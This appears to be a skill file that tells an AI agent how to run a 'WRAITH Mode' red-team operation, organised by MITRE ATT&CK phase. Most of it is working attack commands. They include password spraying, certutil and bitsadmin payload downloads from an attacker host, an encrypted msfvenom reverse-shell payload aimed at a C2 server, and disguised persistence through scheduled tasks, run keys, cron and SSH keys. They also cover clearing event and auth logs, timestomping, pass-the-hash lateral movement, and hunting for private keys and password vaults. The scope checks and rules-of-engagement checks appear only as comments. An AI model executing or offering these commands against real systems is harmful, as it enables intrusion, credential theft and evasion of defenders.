# Skill: /redteam — WRAITH Mode

## Trigger
User types `/redteam` or session mode = redteam

## Core Philosophy
Simulate real threat actor. Stealth > speed. MITRE ATT&CK aligned. Test blue team, not just systems.

---

## Pre-Op Checklist

Before any action:
```bash
# Confirm ROE
cat state/roe.txt  # Rules of Engagement

# Deconfliction check
python3 tools/deconflict.py --check

# Scope verify
python3 tools/scope.py $TARGET

# Kill switch confirmed?
# (emergency stop contact with client CISO)
```

---

## Phase 1: Reconnaissance (T1595, T1589, T1591)

### Passive (OSINT — No direct contact with target)
```bash
# Domain intel
whois $TARGET_DOMAIN
amass enum -passive -d $TARGET_DOMAIN -o raw/$SESSION/amass_passive.txt

# Employee enumeration (LinkedIn, hunter.io)
theHarvester -d $TARGET_DOMAIN -b linkedin -l 200

# Technology fingerprint (passive)
# Shodan: org:"$COMPANY_NAME"
# Censys: parsed.names: $TARGET_DOMAIN

# Breach data
# haveibeenpwned.com API (for authorized intel only)
# DeHashed (if client authorizes)

# GitHub leaks
# site:github.com org:$TARGET_DOMAIN
# Look for: API keys, configs, internal docs
```

### Active (Direct contact — log all)
```bash
nmap -sn $TARGET_CIDR -oG raw/$SESSION/host_discovery.txt --min-rate 100
nmap -sV --open -T3 $TARGET -oN raw/$SESSION/service_scan.txt
# T3 = quieter than T4, less IDS noise
```

---

## Phase 2: Initial Access Vectors

### External-facing Services
```bash
# VPN/Citrix/RDP exposure
nmap -p 443,4443,8443,3389,10443 $TARGET_RANGE

# Password spraying (CAREFUL: lockout policy check first)
# Identify lockout threshold from AD or login page
# Spray at 1 attempt per user per 30min minimum
crackmapexec smb $TARGET -u raw/$SESSION/users.txt \
  -p 'Season2024!' --continue-on-success --no-bruteforce

# Exposed services
crackmapexec smb $TARGET -u '' -p ''  # anonymous SMB
crackmapexec smb $TARGET --shares       # share enum
```

### Phishing Simulation (T1566)
```
# Document only — requires explicit written approval
# Typical payloads:
# - Macro-enabled doc (HTA, VBA)
# - LNK file pointing to SMB share (credential harvesting)  
# - Browser-in-the-browser (BitB) phishing page
# - HTML smuggling

# Infrastructure:
# - Purchase similar domain (typosquat or homoglyph)
# - GoPhish for tracking
# - Valid SSL cert (Let's Encrypt)
```

---

## Phase 3: Execution (T1059)

```bash
# Living off the land — use built-in tools
# Windows:
certutil.exe -urlcache -f http://ATTACKER/payload.exe c:\windows\temp\p.exe
bitsadmin /transfer job /download /priority normal http://ATTACKER/file c:\temp\file

# Avoid: powershell.exe (heavily monitored)
# Prefer: wmic, mshta, rundll32, regsvr32

# Linux:
# bash, python3, curl, wget — all standard

# Staged payload (avoid AV)
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=$C2_HOST LPORT=443 -f exe \
  --encrypt aes256 --encrypt-key RANDOM \
  -o raw/$SESSION/staged.exe
```

---

## Phase 4: Persistence (T1053, T1078, T1098)

```bash
# Windows scheduled task
schtasks /create /tn "WindowsUpdate" /tr "C:\Users\Public\update.exe" \
  /sc daily /st 09:00 /ru SYSTEM

# Registry run key  
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run \
  /v "OneDriveSync" /d "C:\Users\Public\sync.exe" /f

# Linux cron
(crontab -l 2>/dev/null; echo "*/15 * * * * /tmp/.update") | crontab -

# SSH authorized key
echo "ssh-rsa ATTACKER_PUB_KEY" >> ~/.ssh/authorized_keys

# Document ALL persistence in wiki/red_team/persistence.md
```

---

## Phase 5: Defense Evasion (T1036, T1070, T1027)

```bash
# Clear logs (document that you did this in report — client needs to know)
# Windows:
wevtutil cl System
wevtutil cl Security
wevtutil cl Application

# Linux:
> /var/log/auth.log
> /var/log/syslog
history -c && history -w

# Timestomping
touch -t 202001010000 /tmp/backdoor

# Process masquerading
# Name process like: svchost.exe, explorer.exe
# Use parent process spoofing
```

---

## Phase 6: Lateral Movement (T1021, T1550)

```bash
# ALWAYS scope check before moving to new host
python3 tools/scope.py $NEW_TARGET || exit 1

# SMB lateral movement
crackmapexec smb $TARGET_RANGE -u $USER -H $NTLM_HASH \
  --local-auth --continue-on-success

# WMI exec (quieter than psexec)
impacket-wmiexec $DOMAIN/$USER:$PASS@$TARGET

# Pass the Hash
impacket-psexec $DOMAIN/$USER@$TARGET -hashes :$NTLM_HASH

# Pass the Ticket
impacket-getTGT $DOMAIN/$USER:$PASS
export KRB5CCNAME=user.ccache
impacket-psexec $TARGET -k -no-pass

# BloodHound — map attack paths
bloodhound-python -u $USER -p $PASS -d $DOMAIN -ns $DC_IP --zip
neo4j start
# Import zip → find shortest path to Domain Admin
```

---

## Phase 7: Collection & Exfil Simulation (T1005, T1041)

```bash
# Data staging (SIMULATION ONLY — no real sensitive data)
# Identify crown jewel locations
find / -name "*.kdbx" -o -name "*.pfx" 2>/dev/null  # password DBs, certs
find / -name "id_rsa" 2>/dev/null  # SSH private keys

# Simulated exfil (document the method, don't actually exfil client data)
# DNS exfil: iodine / dnscat2
# HTTPS: blend into normal traffic
# Note in report: "Attacker could exfil data via [method]"
```

